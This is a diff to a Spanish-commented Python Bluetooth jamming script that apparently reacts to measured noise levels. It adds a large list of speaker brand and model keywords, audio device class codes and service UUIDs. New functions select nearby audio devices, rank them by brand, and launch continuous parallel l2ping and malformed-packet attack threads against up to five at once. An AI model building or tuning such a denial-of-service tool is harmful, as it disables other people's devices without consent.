@@ -56,7 +56,7 @@ max_threshold_db = 120  # Umbral máximo
 
 # ===== CONFIGURACIÓN DE ATAQUE OPTIMIZADA =====
 # L2CAP Ping parameters
-l2ping_threads_per_device = 40  # Threads paralelos por dispositivo (antes: 10)
+l2ping_threads_per_device = 15  # Threads paralelos (reducido de 40 para evitar saturación)
 l2ping_package_sizes = [600, 800, 1200]  # Probar múltiples tamaños de MTU
 l2ping_timeout = 2  # Timeout para cada ping
 
@@ -70,6 +70,75 @@ avdtp_malformed_packets = True  # Enviar packets AVDTP malformados
 
 # SDP enumeration
 sdp_enumerate_before_attack = True  # Enumerar servicios SDP primero
+sdp_timeout = 2  # Timeout reducido de 10s a 2s para no esperar tanto
+
+# Attack filtering (CRÍTICO para concentrar el ataque)
+max_simultaneous_attacks = 5  # Máximo dispositivos atacados simultáneamente
+attack_only_audio_devices = True  # Solo atacar dispositivos de audio identificados
+exclude_ble_from_classic_attacks = True  # No atacar BLE con L2CAP/RFCOMM
+
+# ===== DICCIONARIO DE DISPOSITIVOS DE AUDIO =====
+# Palabras clave que identifican parlantes/speakers en nombres de dispositivos
+AUDIO_DEVICE_KEYWORDS = [
+    # Palabras generales de audio
+    'speaker', 'parlante', 'altavoz', 'soundbar', 'sound bar', 'audio',
+    'boom', 'blast', 'play', 'music', 'wireless speaker', 'bluetooth speaker',
+
+    # Marcas premium de audio
+    'jbl', 'bose', 'sony', 'samsung', 'lg', 'philips', 'marshall',
+    'harman', 'kardon', 'harman/kardon', 'beats', 'dr. beats', 'dre',
+    'klipsch', 'yamaha', 'pioneer', 'denon', 'onkyo', 'marantz',
+
+    # Marcas populares
+    'anker', 'soundcore', 'ultimate ears', 'ue', 'tribit', 'doss',
+    'oontz', 'wonderboom', 'megaboom', 'hyperboom', 'soundlink',
+    'flip', 'charge', 'xtreme', 'pulse', 'go', 'clip', 'mini',
+
+    # Marcas chinas comunes
+    'xiaomi', 'mi speaker', 'redmi', 'huawei', 'honor', 'oppo',
+    'realme', 'oneplus', 'vivo', 'tecno', 'infinix', 'itel',
+    'tronsmart', 'bluedio', 'zealot', 'w-king', 'mifa', 'ggmm',
+    'edifier', 'creative', 'musky', 'sanag', 'hopestar', 'toproad',
+
+    # Nombres genéricos de parlantes chinos
+    'bt speaker', 'bt-speaker', 'wireless', 'portable speaker',
+    'mini speaker', 'outdoor speaker', 'waterproof speaker',
+    'astronaut', 'robot', 'alien', 'spaceman',  # Astronaut Speaker!
+
+    # Soundbars y home theater
+    'soundbar', 'sound bar', 'home theater', 'tv speaker', 'subwoofer',
+    'surround', '5.1', '7.1', 'dolby', 'atmos',
+
+    # Smart speakers
+    'alexa', 'echo', 'google home', 'nest audio', 'homepod', 'siri',
+
+    # Modelos específicos conocidos
+    'flip3', 'flip4', 'flip5', 'flip6', 'charge3', 'charge4', 'charge5',
+    'xtreme2', 'xtreme3', 'pulse4', 'pulse5', 'boombox', 'partybox',
+    'soundlink mini', 'soundlink color', 'soundlink revolve',
+    'srs-xb', 'extra bass', 'megaboom 3', 'wonderboom 2',
+]
+
+# Clases de dispositivos Bluetooth que son de audio
+# 0x240400 = Audio/Video (Loudspeaker)
+# 0x240408 = Audio/Video (Portable Audio)
+# 0x240414 = Audio/Video (HiFi Audio Device)
+# 0x240418 = Audio/Video (Headphones)
+# 0x20041C = Audio/Video (Microphone)
+AUDIO_DEVICE_CLASSES = [
+    0x240400,  # Loudspeaker
+    0x240404,  # Wearable Headset Device
+    0x240408,  # Hands-free Device
+    0x24040C,  # Microphone
+    0x240410,  # Loudspeaker
+    0x240414,  # Headphones
+    0x240418,  # Portable Audio
+    0x24041C,  # Car Audio
+    0x240420,  # Set-top box
+    0x240424,  # HiFi Audio Device
+    0x240428,  # VCR
+    0x24042C,  # Video Camera
+]
 
 # General parameters
 threadsCount = 1000
@@ -152,6 +221,155 @@ encoder_running = False
 display_db_level = 0.0
 display_update_needed = False
 display_lock = threading.Lock()
+
+# ===== FUNCIONES DE FILTRADO DE DISPOSITIVOS =====
+
+def is_audio_device(device):
+    """
+    Determina si un dispositivo es de audio basado en:
+    1. Nombre del dispositivo (keywords)
+    2. Clase del dispositivo Bluetooth
+    3. Servicios SDP (si están disponibles)
+
+    Args:
+        device: Diccionario con información del dispositivo
+               {'addr': 'XX:XX:XX:XX:XX:XX', 'name': 'Device Name', 'class': 0x240400, 'is_ble': False}
+
+    Returns:
+        bool: True si el dispositivo es identificado como dispositivo de audio
+    """
+    # Verificar nombre del dispositivo
+    device_name = device.get('name', '').lower()
+
+    # Si el nombre contiene alguna keyword de audio
+    for keyword in AUDIO_DEVICE_KEYWORDS:
+        if keyword.lower() in device_name:
+            return True
+
+    # Verificar clase del dispositivo (solo Classic Bluetooth)
+    device_class = device.get('class', None)
+    if device_class is not None:
+        if device_class in AUDIO_DEVICE_CLASSES:
+            return True
+
+        # Verificar major device class (bits 8-12)
+        # 0x04 = Audio/Video (cualquier subcategoría)
+        major_class = (device_class >> 8) & 0x1F
+        if major_class == 0x04:  # Audio/Video
+            return True
+
+    # Verificar servicios SDP si están disponibles
+    services = device.get('services', [])
+    audio_service_uuids = [
+        '0000110b',  # Audio Sink
+        '0000110a',  # Audio Source
+        '0000110d',  # Advanced Audio Distribution (A2DP)
+        '0000110e',  # A/V Remote Control
+        '00001108',  # Headset
+        '0000111e',  # Hands-free
+    ]
+
+    for service in services:
+        service_lower = service.lower()
+        for audio_uuid in audio_service_uuids:
+            if audio_uuid in service_lower:
+                return True
+
+    return False
+
+def filter_attack_targets(all_devices):
+    """
+    Filtra y prioriza dispositivos para atacar basado en:
+    1. Si attack_only_audio_devices=True, solo retorna dispositivos de audio
+    2. Excluye dispositivos BLE de ataques Classic si exclude_ble_from_classic_attacks=True
+    3. Limita a max_simultaneous_attacks dispositivos
+
+    Args:
+        all_devices: Lista de diccionarios con dispositivos detectados
+
+    Returns:
+        list: Lista filtrada de dispositivos a atacar (máximo max_simultaneous_attacks)
+    """
+    filtered = []
+
+    for device in all_devices:
+        # Si solo queremos audio, filtrar
+        if attack_only_audio_devices:
+            if not is_audio_device(device):
+                continue
+
+        # Si excluimos BLE de ataques Classic
+        if exclude_ble_from_classic_attacks:
+            if device.get('is_ble', False):
+                # Los dispositivos BLE no deberían atacarse con L2CAP/RFCOMM
+                continue
+
+        filtered.append(device)
+
+    # Priorizar por:
+    # 1. Dispositivos con nombre conocido (no desconocidos)
+    # 2. Dispositivos Classic sobre BLE
+    # 3. Dispositivos con clase de audio definida
+
+    def priority_score(dev):
+        score = 0
+
+        # Prioridad 1: Tiene nombre conocido
+        if dev.get('name', 'Unknown') != 'Unknown':
+            score += 100
+
+        # Prioridad 2: Es Classic (no BLE)
+        if not dev.get('is_ble', False):
+            score += 50
+
+        # Prioridad 3: Tiene clase de audio
+        if dev.get('class', None) in AUDIO_DEVICE_CLASSES:
+            score += 25
+
+        # Prioridad 4: Nombre contiene keyword de marca premium
+        premium_brands = ['jbl', 'bose', 'sony', 'samsung', 'lg', 'marshall', 'astronaut']
+        dev_name_lower = dev.get('name', '').lower()
+        for brand in premium_brands:
+            if brand in dev_name_lower:
+                score += 10
+                break
+
+        return score
+
+    # Ordenar por prioridad (mayor score primero)
+    filtered.sort(key=priority_score, reverse=True)
+
+    # Limitar a max_simultaneous_attacks
+    return filtered[:max_simultaneous_attacks]
+
+def log_device_filtering(all_devices, filtered_devices):
+    """
+    Registra información sobre el filtrado de dispositivos
+    """
+    log_message = f"\n[*] ===== FILTRADO DE DISPOSITIVOS =====\n"
+    log_message += f"[*] Total detectados: {len(all_devices)}\n"
+
+    # Contar por tipo
+    classic_count = sum(1 for d in all_devices if not d.get('is_ble', False))
+    ble_count = sum(1 for d in all_devices if d.get('is_ble', False))
+    audio_count = sum(1 for d in all_devices if is_audio_device(d))
+
+    log_message += f"[*] Classic: {classic_count}, BLE: {ble_count}\n"
+    log_message += f"[*] Dispositivos de audio: {audio_count}\n"
+    log_message += f"[*] Seleccionados para ataque: {len(filtered_devices)}\n"
+
+    if len(filtered_devices) > 0:
+        log_message += f"[*] Objetivos:\n"
+        for dev in filtered_devices:
+            dev_type = "BLE" if dev.get('is_ble', False) else "Classic"
+            log_message += f"    - {dev['addr']} ({dev.get('name', 'Unknown')}) [{dev_type}]\n"
+
+    log_message += f"[*] =====================================\n"
+
+    print(log_message)
+
+    with open(log_path, "a", encoding='utf-8', errors='replace') as log_file:
+        log_file.write(log_message)
 
 def setup_encoder():
     """Configura el encoder rotativo usando polling (más confiable que interrupciones)"""
@@ -718,7 +936,8 @@ def scan_ble_devices():
                                 'addr': addr,
                                 'name': name,
                                 'class': None,
-                                'type': 'BLE'
+                                'is_ble': True,  # Marcar como BLE
+                                'services': []
                             }
                             new_devices += 1
                             print(f"[+] BLE: {addr} - {name or 'Sin nombre'}")
@@ -880,7 +1099,8 @@ def scan_bluetooth_devices():
                 # Intentar obtener nombre
                 name = get_device_name(addr)
                 device['name'] = name
-                device['type'] = 'Classic'
+                device['is_ble'] = False  # Marcar como Classic Bluetooth
+                device['services'] = []
 
                 # GUARDAR TODOS - SIN FILTRAR POR CLASS
                 bt_devices_cache[addr] = device
@@ -906,7 +1126,8 @@ def scan_bluetooth_devices():
                         'addr': addr,
                         'name': name,
                         'class': device_class,
-                        'type': 'Classic'
+                        'is_ble': False,  # Marcar como Classic Bluetooth
+                        'services': []
                     }
                     new_devices_found += 1
                     print(f"[+] Discovery: {addr} - {name}")
@@ -1072,19 +1293,36 @@ def attack_device(device_addr, device_name):
         print(f"[!] Error en ataque: {e}")
 
 def continuous_attack():
-    """Ataque continuo a TODOS los dispositivos en PARALELO"""
+    """Ataque continuo a dispositivos FILTRADOS en PARALELO (máximo 5 simultáneos)"""
     global bt_devices, monitoring
 
     while monitoring:
         if bt_devices:
-            # Atacar TODOS los dispositivos en PARALELO (no secuencial)
+            # ===== APLICAR FILTRADO INTELIGENTE =====
+            # Filtrar solo dispositivos de audio y limitar a max_simultaneous_attacks
+            filtered_devices = filter_attack_targets(bt_devices)
+
+            # Registrar información del filtrado
+            log_device_filtering(bt_devices, filtered_devices)
+
+            if not filtered_devices:
+                # No hay dispositivos de audio para atacar
+                print("[*] No se detectaron dispositivos de audio para atacar")
+                writeLog("No se detectaron dispositivos de audio para atacar")
+                time.sleep(5)
+                continue
+
+            # Atacar solo los dispositivos FILTRADOS en PARALELO
             attack_threads = []
 
-            for device in bt_devices:
+            for device in filtered_devices:
                 if not monitoring:
                     break
 
-                # Lanzar thread de ataque para cada dispositivo
+                print(f"[+] Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")
+                writeLog(f"Iniciando ataque concentrado en: {device['addr']} - {device.get('name', 'Unknown')}")
+
+                # Lanzar thread de ataque para cada dispositivo filtrado
                 thread = threading.Thread(
                     target=attack_device,
                     args=(device['addr'], device.get('name', 'Unknown')),
@@ -1092,10 +1330,10 @@ def continuous_attack():
                 )
                 thread.start()
                 attack_threads.append(thread)
-                time.sleep(0.1)  # 100ms entre dispositivos
+                time.sleep(0.2)  # 200ms entre dispositivos (más tiempo para evitar saturación)
 
-            # Esperar un poco antes de re-atacar
-            time.sleep(5)
+            # Esperar un poco antes de re-atacar (aumentado para evitar saturación)
+            time.sleep(8)
         else:
             time.sleep(1)
 
